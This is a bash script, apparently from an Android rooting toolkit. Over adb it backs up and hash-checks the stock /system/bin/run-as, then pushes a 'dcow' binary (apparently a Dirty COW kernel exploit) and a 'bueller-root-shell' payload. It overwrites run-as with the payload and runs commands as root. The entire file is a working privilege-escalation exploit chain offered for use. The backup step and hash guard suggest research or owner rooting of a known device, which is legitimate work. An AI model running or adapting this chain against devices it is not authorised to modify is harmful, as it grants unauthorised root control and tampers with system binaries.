#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/lib.sh"
guard_device

EXPECTED_RUN_AS_SHA256='2b7d8d94b4cafa15ad8c55644b835a24d39217e94f2c5b4c9221256055f37864'
DCOW="$REPO_ROOT/artifacts/dcow"
PAYLOAD="$REPO_ROOT/artifacts/bueller-root-shell"
COMMAND="${*:-id}"
quoted_command="$(remote_quote "$COMMAND")"
invoke="exec /system/bin/run-as -c $quoted_command /proc/self/task/\$\$/attr/current"

[[ -x "$DCOW" && -x "$PAYLOAD" ]] || die 'Run scripts/build-root-helper.sh first'

existing="$(adb_cmd shell "$invoke" 2>/dev/null || true)"
if [[ "$existing" == *'uid=0(root)'* || "$COMMAND" != id && -n "$existing" ]]; then
    printf '%s\n' "$existing"
    exit 0
fi

stamp="$(date -u +%Y%m%dT%H%M%SZ)"
backup_dir="$REPO_ROOT/state/root-$stamp"
mkdir -p "$backup_dir"
adb_cmd pull /system/bin/run-as "$backup_dir/run-as.original" >/dev/null
actual_sha="$(sha256sum "$backup_dir/run-as.original" | awk '{print $1}')"
printf '%s  run-as.original\n' "$actual_sha" > "$backup_dir/SHA256SUMS"
if [[ "$actual_sha" != "$EXPECTED_RUN_AS_SHA256" && "${ALLOW_UNKNOWN_RUN_AS:-0}" != 1 ]]; then
    die "Stock run-as hash mismatch: $actual_sha"
fi

adb_cmd push "$DCOW" /data/local/tmp/dcow >/dev/null
adb_cmd push "$PAYLOAD" /data/local/tmp/bueller-root-shell >/dev/null
adb_cmd shell chmod 0755 /data/local/tmp/dcow /data/local/tmp/bueller-root-shell
adb_cmd shell "/data/local/tmp/dcow /data/local/tmp/bueller-root-shell /system/bin/run-as --no-pad" >/dev/null
adb_cmd shell "$invoke"

